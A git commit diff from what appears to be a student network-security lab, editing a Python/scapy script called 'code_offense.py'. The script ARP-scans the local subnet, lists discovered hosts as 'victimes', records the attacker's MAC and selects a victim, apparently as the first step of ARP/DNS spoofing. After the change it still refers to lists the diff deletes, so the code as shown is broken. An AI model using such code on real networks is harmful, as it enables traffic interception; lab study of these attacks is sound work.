9ac00972e1c65af2d7d080f65dd8b13ffa2802bf
PELLIER Joris <joris.pellier@ynov.com>
2022-11-13 23:57:17 +0100

    update

--- Tp_Reseau_5/code_offense.py
+++ Tp_Reseau_5/code_offense.py
@@ -1,22 +1,24 @@
 #!/usr/bin/env python3
-
 from scapy.all import *
-from scapy.all import IP, Ether, ARP, UDP, DNS, DNSRR, DNSQR
+from scapy.all import IP, Ether, ARP, UDP, DNS, DNSRR, DNSQR, srp, get_if_addr, get_if_hwaddr
 
 network_addr = get_if_addr(conf.iface).split('.')
-network_addr = network_addr[0] + "." + network_addr[1] + "." + network_addr[2] + ".0/24" # obtient l'adresse ip du réseau
+network_addr = network_addr[0] + "." + network_addr[1] + "." + network_addr[2] + ".0/24"
+
+packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_addr) # Cree les paquets
+
+victimes = []
+
+for sent, received in srp(packet, timeout=3)[0]:
+    victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
+# Ajoute les infos de chaque nouvel appareil trouve dans le tableau
+
+print("\n" + "Available devices in the network :" + "\n" + "IP" + " "*18 + "MAC")
+for victime in victimes: # affiche les adresse ip et mac des appareils connectes au reseau qui sont dans le tableau victimes
+    print(victime['ip'])
+    print(victime['mac'] + "\n") 
+
 mac_of_atk = get_if_hwaddr(conf.iface) # obtient l'adresse mac de l'attaquant
-
-arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_addr) # Cree les paquets
-
-IP_MAC_responses, unans = srp(arp_packet, timeout=2)
-
-MAC_on_network = []
-IP_on_network = []
-
-for i in range(len(IP_MAC_responses)):
-    MAC_on_network.append(IP_MAC_responses[i][1].hwsrc) # récupére les mac dans le réseau
-    IP_on_network.append(IP_MAC_responses[i][1].psrc) # récupére les ip dans le réseau
 
 victim_IP = IP_on_network[1]
 victim_MAC = MAC_on_network[1]
